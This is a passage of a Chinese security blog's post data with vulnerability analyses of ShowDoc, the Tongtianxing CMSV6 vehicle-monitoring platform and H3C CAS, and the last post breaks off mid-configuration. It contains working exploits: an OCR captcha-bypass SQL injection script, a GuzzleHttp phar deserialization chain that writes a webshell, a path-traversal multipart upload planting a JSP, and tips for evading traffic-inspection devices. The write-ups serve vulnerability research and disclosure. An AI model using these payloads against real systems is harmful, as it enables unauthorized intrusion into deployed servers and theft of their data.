参考链接https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"GeoServer","slug":"GeoServer","permalink":"https://y4tacker.github.io/tags/GeoServer/"}]},{"title":"ShowDocV3.2.5最新版SQL注入及老版本反序列化分析","slug":"year/2024/5/ShowDocV3-2-5最新版SQL注入及老版本反序列化分析","date":"2024-05-28T09:43:33.000Z","updated":"2024-06-04T14:10:56.000Z","comments":true,"path":"2024/05/28/year/2024/5/ShowDocV3-2-5最新版SQL注入及老版本反序列化分析/","link":"","permalink":"https://y4tacker.github.io/2024/05/28/year/2024/5/ShowDocV3-2-5%E6%9C%80%E6%96%B0%E7%89%88SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%80%81%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","excerpt":"","text":"ShowDocV3.2.5最新版SQL注入及老版本反序列化分析注入从提交记录我们能找到一些提示 https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30#diff-b4363835fc1321f859d1faaad5a5a283db695849ca98c4e949fbf1bed8c84a31 首先首当其冲，第一行先是将函数new_is_writeable权限改为private，这应该是作者一开始的失误（这个函数在其他地方都有出现且都是private修饰，仅仅在这里是public），而这个函数的作用聪明一点看了某步的通告都知道应该能猜到和phar反序列化有关 其后看其他修改的地方或许你会感到很懵逼，似乎都与注入没关系，仔细看猜测应该是架构代码方面的变动，从一些细节也能看到其实改动挺糙的，但看起来改了很久。 看遍前台功能的代码后会发现注入点非常简单,https://github.com/star7th/showdoc/blob/5b6b095899b71af7728a8371c668bb288ccfd1e9/server/Application/Api/Controller/ItemController.class.php#L577，在这里可以看到item_id其实是没有做类型转换，后面的代码中`$item = D(“Item”)-&gt;where(“item_id = ‘$item_id’ “)-&gt;find();`item_id直接做了拼接(多说一下要想防止注入应该使用前面代码中的数组的方式实现参数绑定) 123456789101112131415161718192021222324252627282930313233343536373839public function pwd()&#123; $item_id = I(&quot;item_id&quot;); $page_id = I(&quot;page_id/d&quot;); $password = I(&quot;password&quot;); $refer_url = I(&#x27;refer_url&#x27;); $captcha_id = I(&quot;captcha_id&quot;); $captcha = I(&quot;captcha&quot;); if (!D(&quot;Captcha&quot;)-&gt;check($captcha_id, $captcha)) &#123; $this-&gt;sendError(10206, L(&#x27;verification_code_are_incorrect&#x27;)); return; &#125; if (!is_numeric($item_id)) &#123; $item_domain = $item_id; &#125; //判断个性域名 if ($item_domain) &#123; $item = D(&quot;Item&quot;)-&gt;where(&quot;item_domain = &#x27;%s&#x27;&quot;, array($item_domain))-&gt;find(); if ($item[&#x27;item_id&#x27;]) &#123; $item_id = $item[&#x27;item_id&#x27;]; &#125; &#125; if ($page_id &gt; 0) &#123; $page = M(&quot;Page&quot;)-&gt;where(&quot; page_id = &#x27;$page_id&#x27; &quot;)-&gt;find(); if ($page) &#123; $item_id = $page[&#x27;item_id&#x27;]; &#125; &#125; $item = D(&quot;Item&quot;)-&gt;where(&quot;item_id = &#x27;$item_id&#x27; &quot;)-&gt;find(); if ($password &amp;&amp; $item[&#x27;password&#x27;] == $password) &#123; session(&quot;visit_item_&quot; . $item_id, 1); $this-&gt;sendResult(array(&quot;refer_url&quot; =&gt; base64_decode($refer_url))); &#125; else &#123; $this-&gt;sendError(10010, L(&#x27;access_password_are_incorrect&#x27;)); &#125;&#125; 另外在利用时会受验证码的影响，当然由于生成的验证码其实是非常简单的，根据以上逻辑我们很容易得到验证脚本，在以下脚本中只要返回&#123;&quot;error_code&quot;:0,&quot;data&quot;:&#123;&quot;refer_url&quot;:&quot;Hacked By Y4tacker&quot;&#125;&#125;即利用成功(本篇以Mysql环境做分析，SQLite类似不做过多重复工作) 12345678910111213141516171819202122import ddddocrimport requestsocr = ddddocr.DdddOcr()sess = requests.session()pre_url = &quot;http://xxx:1235&quot;def capture(): captcha_id = sess.get(pre_url + &quot;/server/index.php?s=/api/common/createCaptcha&quot;).json()[&#x27;data&#x27;][&#x27;captcha_id&#x27;] captcha = sess.get(pre_url + f&quot;/server/index.php?s=/api/common/showCaptcha&amp;captcha_id=&#123;captcha_id&#125;&quot;).content captcha_code = ocr.classification(captcha) return captcha_id, captcha_codecaptcha_id, captcha_code = capture()r = sess.get( url=f&quot;http://xxxx:1235/server/index.php?s=/Api/Item/pwd&amp;captcha_id=&#123;captcha_id&#125;&amp;captcha=&#123;captcha_code&#125;&amp;item_id=y4&#x27;) union select 1,2,3,4,5,6,7,8,9,10,11,12--&amp;password=6&amp;refer_url=SGFja2VkIEJ5IFk0dGFja2Vy&amp;1716885664000&quot;).textprint(r) 在后利用的过程中会发现一个很有意思的表user_token，其中存了token字段 这是一个非常有意思的字段，在很多函数中都会用到checkLogin来判断是否登录，如果我们知道token那么就能直接登录任意用户了 123456789101112131415161718192021222324public function checkLogin($redirect = true)&#123; if (!session(&quot;login_user&quot;)) &#123; $user_token = I(&quot;user_token&quot;) ? I(&quot;user_token&quot;) : cookie(&#x27;cookie_token&#x27;); $user_token = $user_token ? $user_token : $_REQUEST[&#x27;user_token&#x27;]; if ($user_token) &#123; $ret = D(&quot;UserToken&quot;)-&gt;getToken($user_token); if ($ret &amp;&amp; $ret[&#x27;token_expire&#x27;] &gt; time()) &#123; D(&quot;UserToken&quot;)-&gt;setLastTime($user_token); $login_user = D(&quot;User&quot;)-&gt;where(&quot;uid = $ret[uid]&quot;)-&gt;find(); unset($ret[&#x27;password&#x27;]); session(&quot;login_user&quot;, $login_user); return $login_user; &#125; &#125; if ($redirect) &#123; $this-&gt;sendError(10102); exit(); &#125; &#125; else &#123; return session(&quot;login_user&quot;); &#125;&#125; V &lt; 3.2.5 反序列化首先既然是TP的框架那么首当其冲我们就可以先看看ThinkPHP的版本，如果有合适的版本那么直接就可以拿来用了 在https://github.com/star7th/showdoc/blob/v3.2.4/server/ThinkPHP/ThinkPHP.php中我们不难发现版本居然是`3.2.3`，看到这个老版本号就知道想通过TP的反序列化直接RCE不太现实了，但我们不必沮丧，这个系统有composer包管理，因此我们便可以看看能不能通过第三方依赖实现反序列化到RCE的效果 https://github.com/star7th/showdoc/tree/v3.2.4/server/vendor 当然答案是YES，在访问后我们一眼能看到一个老朋友GuzzleHttp，因此我们可以直接用现成的链子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace GuzzleHttp\\Cookie&#123; class SetCookie &#123; private static $defaults = [ &#x27;Name&#x27; =&gt; null, &#x27;Value&#x27; =&gt; null, &#x27;Domain&#x27; =&gt; null, &#x27;Path&#x27; =&gt; &#x27;/&#x27;, &#x27;Max-Age&#x27; =&gt; null, &#x27;Expires&#x27; =&gt; null, &#x27;Secure&#x27; =&gt; false, &#x27;Discard&#x27; =&gt; false, &#x27;HttpOnly&#x27; =&gt; false ]; function __construct() &#123; $this-&gt;data[&#x27;Expires&#x27;] = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;data[&#x27;Discard&#x27;] = 0; &#125; &#125; class CookieJar&#123; private $cookies = []; private $strictMode; function __construct() &#123; $this-&gt;cookies[] = new SetCookie(); &#125; &#125; class FileCookieJar extends CookieJar &#123; private $filename; private $storeSessionCookies; function __construct() &#123; parent::__construct(); $this-&gt;filename = &quot;y4tacker.php&quot;; $this-&gt;storeSessionCookies = true; &#125; &#125;&#125;namespace&#123; $pop = new \\GuzzleHttp\\Cookie\\FileCookieJar(); $phar = new \\Phar(&quot;y4tacker.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&#x27;GIF89a&#x27;.&quot;__HALT_COMPILER();&quot;); $phar-&gt;setMetadata($pop); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();&#125; 之后在后台上传文件得到文件名后，就能访问/server/index.php?s=/home/index/new_is_writeable&amp;file=phar://../Public/Uploads/xxxx-xx-xx/xx.png触发反序列化实现webshell写入 后话正如开篇说的那般，此次提交仅仅只修复了反序列化触发的点，并没有修复sql注入也就导致了新版依然暴露在被攻击的风险当中 今天再看终于被修复了:https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda，可以安心删除博客密码了","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"ShowDoc","slug":"ShowDoc","permalink":"https://y4tacker.github.io/tags/ShowDoc/"}]},{"title":"浅析通天星CMSV6车载定位监控平台远程代码执行漏洞","slug":"year/2024/5/浅析通天星CMSV6车载定位监控平台远程代码执行漏洞","date":"2024-05-18T13:28:19.000Z","updated":"2024-05-23T09:18:08.000Z","comments":true,"path":"2024/05/18/year/2024/5/浅析通天星CMSV6车载定位监控平台远程代码执行漏洞/","link":"","permalink":"https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"浅析通天星CMSV6车载定位监控平台远程代码执行漏洞写在前面看了一下通告看着还是比较有意思的，通天星CMSV6车载定位监控平台远程代码执行漏洞 第一步是通过任意文件读取漏洞，读取log日志获取admin的session信息 第二步通过默认密码登录ftp服务器上传文件(或通过后台任意文件上传漏洞) 第三步触发上传文件中的恶意代码 正文采用了经典SSH架构 任意文件读取关于任意文件读取，从官方安全公告也不难看出: (中危)修复StandardSchoolBusAction_downLoad.action接口任意文件下载问题 漏洞点位于StandardSchoolBusAction的downLoad功能，这部分访问规则的配置看struts2.xml即可 定义了class与mothod的访问方式 1&lt;action name=&quot;**/*_*.action&quot; class=&quot;&#123;2&#125;&quot; method=&quot;&#123;3&#125;&quot;&gt; 经过简单的分析发现，实际漏洞点在com.gpsCommon.action.CommonBaseAction#downLoad，代码逻辑比较简单就不详细分析了，相关代码如下，可以看到读取的文件不仅可以是使用绝对路径，也可以使用相对路径读取任意文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899public String downLoad() &#123; int result = 0; try &#123; String filePath = this.getDownloadFileRealPath(this.getRequest()); if ((!filePath.contains(&quot;tomcat/&quot;) || filePath.contains(&quot;tomcat/ttxapps&quot;)) &amp;&amp; !filePath.contains(&quot;.xml&quot;) &amp;&amp; !filePath.contains(&quot;WEB-INF&quot;) &amp;&amp; !filePath.contains(&quot;classes&quot;)) &#123; if (!AssertUtils.isNull(filePath)) &#123; InputStream ins = null; BufferedInputStream bins = null; OutputStream outs = null; BufferedOutputStream bouts = null; Integer requestStringEx = this.getRequestInteger(&quot;isTure&quot;); Integer isStream = this.getRequestInteger(&quot;isStream&quot;); Integer isDel = this.getRequestInteger(&quot;isDel&quot;); String fileRealPath = null; if (requestStringEx != null &amp;&amp; requestStringEx == 1) &#123; fileRealPath = filePath; &#125; else &#123; fileRealPath = this.getDownloadFileRealPath(this.getServletContext(), filePath); &#125; File file = new File(fileRealPath); if (file.exists()) &#123; ins = new FileInputStream(fileRealPath); bins = new BufferedInputStream(ins); outs = this.getResponse().getOutputStream(); bouts = new BufferedOutputStream(outs); if (isStream == null || isStream != 1) &#123; this.setDownLoadParam(this.getRequest(), this.getResponse(), file.getName()); &#125; int b = false; byte[] buffer = new byte[512]; int b; while((b = bins.read(buffer)) != -1) &#123; bouts.write(buffer, 0, b); &#125; bouts.flush(); ins.close(); bins.close(); outs.close(); bouts.close(); if (isDel != null &amp;&amp; isDel == 1 &amp;&amp; file.exists()) &#123; file.delete(); &#125; &#125; else &#123; result = 44; this.addCustomResponse(ACTION_RESULT, 44); this.addCustomResponse(ACTION_RESULT_TIP, &quot;File Not Exist!&quot;); this.log.error(&quot;下载的文件不存在&quot;); &#125; &#125; else &#123; result = 8; this.addCustomResponse(ACTION_RESULT, 8); this.addCustomResponse(ACTION_RESULT_TIP, &quot;Request Param Error!&quot;); this.log.error(&quot;下载文件时参数错误&quot;); &#125; &#125; else &#123; result = 24; this.addCustomResponse(ACTION_RESULT, 24); this.addCustomResponse(ACTION_RESULT_TIP, &quot;Permission denied!&quot;); this.log.error(&quot;用户无权限下载Tomcat内的文件&quot;); &#125; &#125; catch (Exception var14) &#123; this.log.error(var14.getMessage(), var14); result = 4; this.addCustomResponse(ACTION_RESULT, 4); this.addCustomResponse(ACTION_RESULT_TIP, &quot;Request Exception!&quot;); &#125; return this.getReturnParam(result);&#125;protected String getDownloadFileRealPath(HttpServletRequest request) &#123; return this.getRequestStringEx(&quot;path&quot;);&#125;public String getRequestStringEx(String parameter) &#123; return RequestUtil.getRequestStringEx(parameter);&#125;public static String getRequestStringEx(String parameter) &#123; try &#123; HttpServletRequest request = getRequest(); if (request == null) &#123; return null; &#125; else &#123; request.setCharacterEncoding(&quot;UTF-8&quot;); String param = request.getParameter(parameter); return param != null ? URLDecoder.decode(param, StandardCharsets.UTF_8) : null; &#125; &#125; catch (Exception var3) &#123; log.error(var3.getMessage(), var3); return null; &#125;&#125; 通过任意文件读取我们能很容易读取到session信息 另外多提一嘴，漏洞点com.gpsCommon.action.CommonBaseAction#downLoad在抽象类当中，通过将tomcat下class手动打包为jar后分析，不难发现实际受影响的路由多达320个，因此实际利用时我们不必拘泥与官方公告提到的一种 后台文件上传文件上传有两种方式，一种通过FTP服务，如果用户为更改默认密码那么即可使用其登录上传文件 另一种，既然有了session，我们便很容易能够使用此session调用后台接口，比如WebuploaderAction#ajaxAttachAllFileUpload 但很可惜的是代码中有关于上传文件后缀的严格限制，因此我们无法实现直接上传webshell文件 12String getsuffix = getsuffixEx(fileName);if (!limitType(getsuffix)) &#123; 反序列化但我们不必灰心，在公告中我们不难发现上传了一些名为jasper后缀的文件 因此我们需要去寻找加载恶意jasper文件的路由，在com.gps808.operationManagement.action.StandardLineAction#report 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576public void report() &#123; try &#123; String format = this.getRequestString(&quot;format&quot;); String name = this.getRequestString(&quot;name&quot;); String lid = this.getRequestString(&quot;id&quot;); String direct = this.getRequestString(&quot;direct&quot;); String disposition = this.getRequestString(&quot;disposition&quot;); String reportTitle = &quot;&quot;; StandardCompany line = (StandardCompany)this.standardLineService.getObject(StandardCompany.class, Integer.parseInt(lid)); if (line != null) &#123; reportTitle = line.getName(); if (direct != null) &#123; if (direct.equals(&quot;0&quot;)) &#123; reportTitle = reportTitle + &quot;S&quot;; &#125; else if (direct.equals(&quot;1&quot;)) &#123; reportTitle = reportTitle + &quot;X&quot;; &#125; &#125; &#125; AjaxDto&lt;StandardLineStationRelationStation&gt; stationRelation = this.standardLineService.getLineStationInfos(Integer.parseInt(lid), Integer.parseInt(direct), 1, &quot; order by sindex asc &quot;, (Pagination)null); List&lt;Map&gt; list = new ArrayList(); String language = this.getAndUpdateSessionLanguage(); if (stationRelation != null &amp;&amp; stationRelation.getPageList() != null) &#123; int i = 0; for(int j = stationRelation.getPageList().size(); i &lt; j; ++i) &#123; StandardLineStationRelationStation relation = (StandardLineStationRelationStation)stationRelation.getPageList().get(i); Map map = new HashMap(); map.put(&quot;sindex&quot;, relation.getSindex()); map.put(&quot;name&quot;, relation.getStation().getName()); map.put(&quot;direct&quot;, this.getStationDirectEx(relation.getStation().getDirect(), language)); map.put(&quot;stype&quot;, this.getStationTypeEx(relation.getStype(), language)); map.put(&quot;lngIn&quot;, GpsUtil.formatPosition(relation.getStation().getLngIn())); map.put(&quot;latIn&quot;, GpsUtil.formatPosition(relation.getStation().getLatIn())); map.put(&quot;angleIn&quot;, relation.getStation().getAngleIn()); map.put(&quot;speed&quot;, GpsUtil.getFormatSpeed(relation.getSpeed(), 1, new Boolean[0])); map.put(&quot;len&quot;, GpsUtil.getFormatLiCheng(relation.getLen())); list.add(map); &#125; &#125; Map mapHeads = new HashMap(); mapHeads.put(&quot;sindex&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_index&quot;, language)); mapHeads.put(&quot;name&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_name&quot;, language)); mapHeads.put(&quot;direct&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_direction&quot;, language)); mapHeads.put(&quot;stype&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_type&quot;, language)); mapHeads.put(&quot;lngIn&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_in_lng&quot;, language)); mapHeads.put(&quot;latIn&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_in_lat&quot;, language)); mapHeads.put(&quot;angleIn&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_in_angle&quot;, language)); mapHeads.put(&quot;speed&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_limit_speed&quot;, language) + &quot; (KM/H)&quot;); mapHeads.put(&quot;len&quot;, LanguageCache.getLanguageTextEx(&quot;line_station_distance&quot;, language) + &quot; (KM)&quot;); ReportPrint print = null; try &#123; print = this.getReportCreate().createReport(name); print.setMapHeads(mapHeads); print.setReportTitle(reportTitle); print.setDateSource(list); print.setFormat(format); print.setDocumentName(name); print.setDisposition(disposition); print.exportReport(); &#125; catch (IOException var15) &#123; this.log.error(var15.getMessage(), var15); &#125; catch (ServletException var16) &#123; this.log.error(var16.getMessage(), var16); &#125; catch (Exception var17) &#123; this.log.error(var17.getMessage(), var17); &#125; &#125; catch (Exception var18) &#123; this.log.error(var18.getMessage(), var18); this.addCustomResponse(ACTION_RESULT, 1); &#125;&#125; 在这些代码中我们重点关注this.getReportCreate().createReport(name); 12345678910111213141516171819// com.gpsCommon.action.CommonBaseActionprotected ReportCreater getReportCreate() &#123; if (this.reportCreate == null) &#123; this.reportCreate = new ReportCreater(); this.reportCreate.setJasperReportPath(ServletActionContext.getServletContext().getRealPath(&quot;WEB-INF\\\\jasper&quot;)); &#125; return this.reportCreate;&#125;// com.framework.jasperReports.ReportCreater#createReportpublic ReportPrint createReport(String reportKey) throws IOException &#123; try &#123; return this._createReport(reportKey); &#125; catch (JRException var3) &#123; this.log.error(var3.getMessage(), var3); throw new IOException(); &#125;&#125; 继续跟进_createReport的调用， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// com.framework.jasperReports.ReportCreaterprivate ReportPrint _createReport(String reportKey) throws JRException, IOException &#123; JasperReport jasperReport = this.getJasperReport(reportKey); Map parameters = this.getParameters_(reportKey); ReportPrint reportPrint = new ReportPrint(jasperReport, parameters); return reportPrint;&#125;private JasperReport getJasperReport(String reportKey) throws IOException, JRException &#123; JasperReport jasperReport = null; if (this.jasperDesignMap.containsKey(reportKey)) &#123; jasperReport = (JasperReport)this.jasperDesignMap.get(reportKey); &#125; else &#123; jasperReport = this.getJasperReportFromFile(reportKey); this.jasperDesignMap.put(reportKey, jasperReport); &#125; return jasperReport;&#125;private JasperReport getJasperReportFromFile(String reportKey) throws IOException, JRException &#123; String filePath = this.jasperReportPath + &quot;\\\\&quot; + reportKey + &quot;.jasper&quot;; File reportFile = null; JasperReport jasperReport = null; reportFile = new File(filePath); if (reportFile.exists() &amp;&amp; reportFile.isFile()) &#123; jasperReport = (JasperReport)JRLoader.loadObject(reportFile); &#125; return jasperReport;&#125;// net.sf.jasperreports.engine.util.JRLoaderpublic static Object loadObject(File file) throws JRException &#123; return loadObject(DefaultJasperReportsContext.getInstance(), (File)file);&#125;public static Object loadObject(JasperReportsContext jasperReportsContext, File file) throws JRException &#123; if (file.exists() &amp;&amp; file.isFile()) &#123; Object obj = null; FileInputStream fis = null; ObjectInputStream ois = null; try &#123; fis = new FileInputStream(file); BufferedInputStream bufferedIn = new BufferedInputStream(fis); ois = new ContextClassLoaderObjectInputStream(jasperReportsContext, bufferedIn); obj = ois.readObject(); &#125; catch (IOException var17) &#123; throw new JRException(&quot;util.loader.object.from.file.loading.error&quot;, new Object[]&#123;file&#125;, var17); &#125; catch (ClassNotFoundException var18) &#123; throw new JRException(&quot;util.loader.class.not.found.from.file&quot;, new Object[]&#123;file&#125;, var18); &#125; finally &#123; if (ois != null) &#123; try &#123; ois.close(); &#125; catch (IOException var16) &#123; &#125; &#125; if (fis != null) &#123; try &#123; fis.close(); &#125; catch (IOException var15) &#123; &#125; &#125; &#125; return obj; &#125; else &#123; throw new JRException(new FileNotFoundException(String.valueOf(file))); &#125;&#125; 从以下调用链不难发现最终会通过文件内容触发反序列化执行，并且在这过程中文件名未做校验可以穿越到FTP服务目录下 com.framework.jasperReports.ReportCreater#_createReport=&gt;com.framework.jasperReports.ReportCreater#getJasperReport=&gt;com.framework.jasperReports.ReportCreater#getJasperReportFromFile=&gt;net.sf.jasperreports.engine.util.JRLoader#loadObject=&gt;net.sf.jasperreports.engine.util.ContextClassLoaderObjectInputStream#readObject 因此最终漏洞的完整利用就出来了 尝试突破文件上传限制但我们也知道如果仅仅是依赖ftp默认用户名实现文件上传的话那可就太难了，在开始前简单聊一下struts2的配置 在配置中写到了action的访问方式，但我们的路由访问并未出现全类名，那它是怎么找到具体的类的呢？ 1&lt;action name=&quot;*_*.action&quot; class=&quot;&#123;1&#125;&quot; method=&quot;&#123;2&#125;&quot;&gt; 经过查找，可以在applicationContext-xxxx.xml中定义的bean中找到答案，我们可以直接使用bean-name得到这个类 12&lt;bean name=&quot;StandardApiAction&quot; class=&quot;com.gps808.api.action.StandardApiAction&quot; scope=&quot;prototype&quot; parent=&quot;standardUserBaseAction&quot;&gt;xxxxxx 而如果这个类未在xml中定义我们就需要使用全类名来标识这个类，此时我们便可以将目标锁定到com.framework.web.action.FileUploadAction#upload中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.framework.web.action;import java.io.BufferedInputStream;import java.io.BufferedOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.util.List;public class FileUploadAction extends BaseAction &#123; private static final long serialVersionUID = 1L; private String describe; private List&lt;File&gt; uploadFile; private List&lt;String&gt; uploadFileFileName; private List&lt;String&gt; uploadFileContentType; public FileUploadAction() &#123; &#125; public boolean hasOperatorPrivi() &#123; return true; &#125; public void upload() &#123; for(int i = 0; i &lt; this.uploadFileFileName.size(); ++i) &#123; BufferedInputStream bis = null; BufferedOutputStream bos = null; String fileName = (String)this.uploadFileFileName.get(i); try &#123; if (!&quot;&quot;.equals(fileName)) &#123; FileInputStream fis = new FileInputStream((File)this.uploadFile.get(i)); FileOutputStream fos = new FileOutputStream(&quot;C:\\\\&quot; + fileName); bis = new BufferedInputStream(fis); bos = new BufferedOutputStream(fos); byte[] b = new byte[1024]; int len = true; int len; while((len = bis.read(b)) != -1) &#123; bos.write(b, 0, len); &#125; &#125; &#125; catch (Exception var17) &#123; &#125; finally &#123; try &#123; if (bis != null) &#123; bis.close(); &#125; if (bos != null) &#123; bos.close(); &#125; &#125; catch (IOException var16) &#123; &#125; &#125; &#125; &#125; public String image() throws Exception &#123; try &#123; this.upload(); &#125; catch (Exception var2) &#123; this.log.error(var2.getMessage(), var2); this.addCustomResponse(ACTION_RESULT, 1); &#125; return &quot;success&quot;; &#125; public String getDescribe() &#123; return this.describe; &#125; public void setDescribe(String describe) &#123; this.describe = describe; &#125; public List&lt;File&gt; getUploadFile() &#123; return this.uploadFile; &#125; public void setUploadFile(List&lt;File&gt; uploadFile) &#123; this.uploadFile = uploadFile; &#125; public List&lt;String&gt; getUploadFileFileName() &#123; return this.uploadFileFileName; &#125; public void setUploadFileFileName(List&lt;String&gt; uploadFileFileName) &#123; this.uploadFileFileName = uploadFileFileName; &#125; public List&lt;String&gt; getUploadFileContentType() &#123; return this.uploadFileContentType; &#125; public void setUploadFileContentType(List&lt;String&gt; uploadFileContentType) &#123; this.uploadFileContentType = uploadFileContentType; &#125;&#125; 可以在代码中看到直接的路径拼接，FileOutputStream fos = new FileOutputStream(&quot;C:\\\\&quot; + fileName);，因此我们便可以直接上传jasper文件并触发反序列化了 另一方面既然可以任意写入，我们很容易想到在子目录下写入webshell文件，但由于是struts2的上传处理，在org.apache.struts2.interceptor.FileUploadInterceptor中，在这个拦截器最终获取文件名时，会处理带\\以及/的文件名 12345678910111213protected String getCanonicalName(final String originalFileName) &#123; String fileName = originalFileName; int forwardSlash = fileName.lastIndexOf(&#x27;/&#x27;); int backwardSlash = fileName.lastIndexOf(&#x27;\\\\&#x27;); if (forwardSlash != -1 &amp;&amp; forwardSlash &gt; backwardSlash) &#123; fileName = fileName.substring(forwardSlash + 1); &#125; else &#123; fileName = fileName.substring(backwardSlash + 1); &#125; return fileName; &#125; 这时候怎么办呢？我们知道struts2在23年年底出了一个新漏洞，这时候便可以排出用场了，忘了的可以回顾我之前的文章，Apache Struts2 文件上传分析(S2-066) 因此我们便能够构造，达到前台RCE的效果 1234567891011--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfvContent-Disposition: form-data; name=&quot;UploadFile&quot;;filename=&quot;z12.jsp&quot;;Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document&lt;%out.print(&quot;Hacked By Y4tacker&quot;);%&gt;--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfvContent-Disposition: form-data; name=&quot;uploadFileFileName&quot;;Program Files\\CMSServerV6\\tomcat\\webapps\\gpsweb\\1.jsp--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfv-- 但很可惜新版本中struts2的依赖更新到了2.5.33的安全版本，并且将com.framework.web.action.FileUploadAction#upload强行设置了路径404并移除了上传处理逻辑，因此在新版本中也便失效了 结合S2的漏洞时间可以大胆猜测也许是在年底前删除的？当然由于我没有代码所以无处验证了，在实战环境中可以多做尝试 对抗流量设备的一些尝试 不仅仅可以读取log_info.log获取用户session，还可以尝试读取web.xml文件，在当中配置了Druid监控的用户名以及密码，在老版本中这个配置默认启用，新版本中druid监控成为了可选项，但不失为一种漏洞利用的尝试 使用全类名替代bean的获取形式，假如流量设备拦截路由为/StandardABCAction_downLoad，我们完全可以使用/com.xxx.xxxxAction_downLoad的形式尝试绕过 我们不仅可以使用官方公告中使用的StandardSchoolBusAction路由，经过分析凡是继承了com.gpsCommon.action.CommonBaseAction的类均能使用","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"通天星","slug":"通天星","permalink":"https://y4tacker.github.io/tags/%E9%80%9A%E5%A4%A9%E6%98%9F/"}]},{"title":"浅析H3C-CAS虚拟化管理系统权限绕过致文件上传漏洞","slug":"year/2024/5/浅析H3C-CAS虚拟化管理系统权限绕过致文件上传漏洞","date":"2024-05-11T09:03:43.000Z","updated":"2024-05-14T01:32:56.000Z","comments":true,"path":"2024/05/11/year/2024/5/浅析H3C-CAS虚拟化管理系统权限绕过致文件上传漏洞/","link":"","permalink":"https://y4tacker.github.io/2024/05/11/year/2024/5/%E6%B5%85%E6%9E%90H3C-CAS%E8%99%9A%E6%8B%9F%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"浅析H3C-CAS虚拟化管理系统权限绕过致文件上传漏洞写在前面之前四月就关注到了，可是后面不知道什么原因某步下了公众号，今天又被再次提起，当时分析了一半也就是权限相关的调用，现在补上另一半 正文鉴权相关配置简析既然和权限绕过相关那么第一步我们必然要去先看看相关配置，在web.xml配置文件当中，可以看到相关的如下配置 这里我们只要关注两点，第一servelet需要以/carsrs开头，第二配置文件在/com/virtual/plat/config/beans-*.xml下 12345678910111213141516171819202122232425&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath*:/com/virtual/plat/config/beans-*.xml &lt;/param-value&gt;&lt;/context-param&gt;xxxxxx省略xxxxxx&lt;servlet-mapping&gt; &lt;servlet-name&gt;Jersey Spring Web Application&lt;/servlet-name&gt; &lt;url-pattern&gt;/casrs/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:/com/virtual/plat/config/dispatcher-servlet.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;dispatchOptionsRequest&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/servlet&gt; 关联对应配置，这里由于路由前缀固定，想尝试通过静态文件去绕过鉴权限制的老思路可以先暂时放弃，在这里可以重点关注鉴权对应处理的digestFilter对应的类 1234567891011121314151617181920xxxxxx省略xxxxxx(列举部分)&lt;http pattern=&quot;/html/help/**&quot; 